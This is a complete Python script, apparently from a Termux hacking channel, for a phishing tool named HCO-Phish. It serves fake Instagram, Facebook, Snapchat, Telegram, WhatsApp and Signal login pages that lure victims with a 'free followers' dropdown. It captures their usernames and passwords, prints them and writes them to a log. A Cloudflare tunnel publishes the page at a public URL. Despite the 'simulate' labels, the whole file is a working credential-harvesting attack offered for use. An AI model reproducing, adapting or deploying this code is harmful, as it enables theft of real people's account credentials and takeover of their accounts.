#!/usr/bin/env python3
# HCO-Phish v7 – Full Working Version
# Single-file Termux Tool

import os, sys, time, subprocess, threading, webbrowser, shutil
from colorama import Fore, init
from flask import Flask, render_template_string, request

init(autoreset=True)

# ------------------ Tool Lock & YouTube Redirect ------------------ #
def check_subscription():
    print(Fore.RED + "\n🔒 Tool is locked! Subscribe to unlock.\n")
    print(Fore.YELLOW + "Redirecting to Hackers Colony YouTube channel in:")
    for i in range(8,0,-1):
        print(Fore.CYAN + f"  {i}...", end="\r")
        time.sleep(1)
    print(Fore.GREEN + "\nOpening YouTube now...\n")
    try:
        subprocess.run(["termux-open-url","https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"])
    except:
        webbrowser.open("https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input(Fore.GREEN + "Press Enter after subscribing to continue...")

# ------------------ Termux Menu ------------------ #
def show_menu():
    print(Fore.CYAN + "="*60)
    print(Fore.MAGENTA + "MENU — choose a template (enter number):")
    print(Fore.YELLOW + "1) 📷  Instagram")
    print(Fore.BLUE + "2) 📘  Facebook")
    print(Fore.LIGHTMAGENTA_EX + "3) 👻  Snapchat")
    print(Fore.LIGHTCYAN_EX + "4) ✈️  Telegram")
    print(Fore.LIGHTGREEN_EX + "5) 💬  WhatsApp")
    print(Fore.LIGHTBLUE_EX + "6) 🔵  Signal")
    print(Fore.RED + "0) Exit")
    print(Fore.CYAN + "="*60)

choice=None
while choice not in ["0","1","2","3","4","5","6"]:
    show_menu()
    choice=input(Fore.GREEN + "Select (0-6): ").strip()

if choice=="0":
    print(Fore.RED + "[!] Exiting...")
    sys.exit()

services={
    "1":"Instagram",
    "2":"Facebook",
    "3":"Snapchat",
    "4":"Telegram",
    "5":"WhatsApp",
    "6":"Signal"
}

selected_service=services[choice]
print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")

# ------------------ Tool Lock ------------------ #
check_subscription()
print(Fore.CYAN + "[*] Starting local Flask server...")

# ------------------ Flask App ------------------ #
app = Flask(__name__)

# ------------------ HTML Templates ------------------ #
templates = {
"Instagram": """<html><head><title>Instagram</title>
<style>
body{background:#fafafa;font-family:Arial;text-align:center;}
.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
h1{color:#405DE6;font-size:28px;margin-bottom:15px;}
input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #dbdbdb;font-size:16px;}
button{padding:10px 20px;background:#405DE6;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
img{width:120px;margin-bottom:20px;}
</style></head>
<body>
<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
<div class="login-box">
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Username" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div>
</body></html>""",
"Facebook": """<html><head><title>Facebook</title>
<style>
body{background:#e9ebee;font-family:Arial;text-align:center;}
.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
h1{color:#1877f2;font-size:28px;margin-bottom:15px;}
input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
button{padding:10px 20px;background:#1877f2;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
img{width:120px;margin-bottom:20px;}
</style></head>
<body>
<img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
<div class="login-box">
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Email or Phone" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div>
</body></html>""",
"Snapchat": """<html><head><title>Snapchat</title>
<style>
body{background:#fffc00;font-family:Arial;text-align:center;}
.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
h1{color:#fffc00;font-size:28px;margin-bottom:15px;}
input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
button{padding:10px 20px;background:#fffc00;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
</style></head>
<body>
<div class="login-box">
<h1>Snapchat</h1>
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Username" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div>
</body></html>""",
"Telegram": """<html><head><title>Telegram</title>
<style>
body{background:#0088cc;font-family:Arial;text-align:center;}
.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
h1{color:#0088cc;font-size:28px;margin-bottom:15px;}
input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
button{padding:10px 20px;background:#0088cc;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
</style></head>
<body>
<div class="login-box">
<h1>Telegram</h1>
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Phone Number" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div>
</body></html>""",
"WhatsApp": """<html><head><title>WhatsApp</title>
<style>
body{background:#25d366;font-family:Arial;text-align:center;}
.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
h1{color:#25d366;font-size:28px;margin-bottom:15px;}
input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
button{padding:10px 20px;background:#25d366;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
</style></head>
<body>
<div class="login-box">
<h1>WhatsApp</h1>
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Phone Number" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div>
</body></html>""",
"Signal": """<html><head><title>Signal</title>
<style>
body{background:#3a76f0;font-family:Arial;text-align:center;}
.login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
h1{color:#3a76f0;font-size:28px;margin-bottom:15px;}
input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
button{padding:10px 20px;background:#3a76f0;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
</style></head>
<body>
<div class="login-box">
<h1>Signal</h1>
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Phone Number" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div>
</body></html>"""
}

# ------------------ Flask Routes ------------------ #
@app.route("/")
def home_redirect():
    return f"<script>window.location='/simulate/{selected_service.lower()}'</script>"

@app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
def service_page():
    if request.method=="POST":
        followers=request.form.get("followers","N/A")
        username=request.form.get("username","")
        password=request.form.get("password","")
        print(Fore.LIGHTGREEN_EX + f"\n[+] {selected_service} Login Captured!")
        print(Fore.CYAN + f"Followers Selected: {followers}")
        print(Fore.YELLOW + f"Username: {username}")
        print(Fore.RED + f"Password: {password}\n")
        with open("simulation_log.txt","a") as f:
            f.write(f"[{selected_service}] Followers:{followers} {username}:{password}\n")
        return f"<h2>{selected_service} Login submitted successfully!</h2>"
    return render_template_string(templates[selected_service])

# ------------------ Cloudflare Tunnel ------------------ #
def start_cloudflared():
    if shutil.which("cloudflared") is None:
        print(Fore.RED + "[!] cloudflared not installed. Install manually using 'pkg install cloudflared'")
        return
    print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
    proc=subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    while True:
        line=proc.stdout.readline()
        if "trycloudflare.com" in line:
            print(Fore.LIGHTGREEN_EX + f"[*] Public URL: {line.strip()}/simulate/{selected_service.lower()}")
            break

threading.Thread(target=start_cloudflared, daemon=True).start()

# ------------------ Run Flask ------------------ #
app.run(host="0.0.0.0", port=5000)
